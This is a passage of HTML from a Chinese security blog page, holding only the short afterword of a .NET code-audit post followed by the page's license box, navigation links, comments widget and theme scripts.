+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>其实这篇<code>.NET</code>​的审计跟蛮多审计文章不同的，因为一个是他是以<code>ajax</code>​去起的接口，其次就是我们这次审计其实并无设置到他bin目录下的dll文件，为啥呢？因为他把逻辑都写在了cs文件当中了，所以算是比较好审计的了，这篇也算是<code>.NET</code>​的审计入门吧，记录下</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代码审计 - .NET - 通用系统审计</div>
+      <div>https://zjackky.github.io/post/code-audit-net-general-system-audit-24d238.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/ctf-talking-about-the-strong-network-thinkshop-z1xtoji.html" title="CTF - 再谈强网ThinkShop">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CTF - 再谈强网ThinkShop</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/ctf-2023-fortune-net-cup-s7-writ-up-z1kyu7f.html" title="CTF - 2023 强网杯-S7 Write Up ">
+                        <span class="hidden-mobile">CTF - 2023 强网杯-S7 Write Up </span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Zjackky/Zjackky.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
